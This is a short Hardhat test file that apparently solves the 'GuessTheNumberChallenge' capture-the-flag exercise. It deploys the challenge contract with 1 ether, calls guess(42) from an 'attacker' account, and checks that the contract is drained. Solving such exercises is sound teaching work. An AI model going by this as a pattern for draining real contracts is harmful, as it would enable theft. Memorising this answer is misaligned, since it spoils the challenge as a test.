import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract, errors } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheNumberChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('GuessTheNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    await target.guess(42, { value: ethers.utils.parseEther('1') });

    expect(await provider.getBalance(target.address)).to.equal(0);
  });
});
